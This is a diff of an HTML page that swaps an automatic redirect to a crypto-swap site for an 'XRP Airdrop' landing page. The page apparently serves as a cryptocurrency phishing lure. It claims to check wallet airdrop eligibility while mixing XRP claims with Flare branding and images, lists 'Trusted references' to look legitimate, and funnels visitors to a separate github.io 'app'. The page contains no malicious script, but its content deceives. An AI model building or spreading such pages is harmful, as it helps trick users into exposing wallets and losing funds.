@@ -1,11 +1,129 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <meta http-equiv="refresh" content="0;url=https://crypto-swap.us/">
-  <script>
-    location.replace("https://crypto-swap.us/");
-  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>XRP Airdrop</title>
+  <meta name="description" content="XRP Airdrop checks distribution eligibility for XRP from your own wallet before you continue in the app.">
+  <link rel="canonical" href="https://xrp-airdrop-page.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#08090D">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="XRP Airdrop">
+  <meta property="og:description" content="XRP Airdrop checks distribution eligibility for XRP from your own wallet before you continue in the app.">
+  <meta property="og:url" content="https://xrp-airdrop-page.github.io/">
+  <meta property="og:image" content="https://xrp-airdrop-page.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="XRP Airdrop">
+  <meta name="twitter:description" content="XRP Airdrop checks distribution eligibility for XRP from your own wallet before you continue in the app.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
 </head>
-<body></body>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#" aria-label="XRP Airdrop">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>XRP</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://flarescan.com/" target="_blank" rel="nofollow noopener noreferrer">Flarescan</a>
+      <a href="https://www.coingecko.com/en/coins/flare" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://dev.flare.network/support/flr" target="_blank" rel="nofollow noopener noreferrer">Flare Docs</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="XRP Airdrop entry">
+      <h1>XRP Airdrop</h1>
+      <p class="sub"><strong>XRP Airdrop</strong> checks distribution eligibility for XRP from your own wallet before you continue in the app.</p>
+    </section>
+
+    <section class="card" aria-label="Airdrop eligibility preview">
+      <div class="status">
+        <span class="status-dot" aria-hidden="true"></span>
+        <span>Eligibility checked in app</span>
+      </div>
+
+      <div class="rows">
+        <div class="row">
+          <span class="label">Network</span>
+          <span class="value">XRP Ledger</span>
+        </div>
+        <div class="row">
+          <span class="label">Token</span>
+          <span class="token">
+            <img src="flr.png" width="24" height="24" alt="XRP">
+            <span>XRP</span>
+          </span>
+        </div>
+        <label class="wallet">
+          <span class="label">Wallet</span>
+          <input type="text" value="0x... checked in app" readonly aria-label="Wallet checked in app">
+        </label>
+      </div>
+
+      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+      <p class="note">Preview only &mdash; wallet status and distribution details are shown in the app.</p>
+    </section>
+  </main>
+
+  <footer class="foot">
+    <b>XRP Airdrop</b> &mdash; 2026
+  </footer>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://avalanche-ecosystem.github.io/#website",
+        "url": "https://avalanche-ecosystem.github.io/",
+        "name": "XRP Airdrop",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://avalanche-ecosystem.github.io/#org",
+        "name": "XRP",
+        "url": "https://flare.network/",
+        "sameAs": [
+          "https://flare.network/",
+          "https://twitter.com/FlareNetworks",
+          "https://github.com/flare-foundation",
+          "https://dev.flare.network/"
+        ]
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://avalanche-ecosystem.github.io/#app",
+        "name": "XRP Airdrop",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://avalanche-ecosystem.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      }
+    ]
+  }
+  </script>
+
+  <script>
+  (function(){
+    "use strict";
+    var card = document.querySelector(".card");
+    var button = document.querySelector(".act");
+    if(!card || !button) return;
+    button.addEventListener("mouseenter", function(){ card.classList.add("is-ready"); });
+    button.addEventListener("mouseleave", function(){ card.classList.remove("is-ready"); });
+  })();
+  </script>
+</body>
 </html>
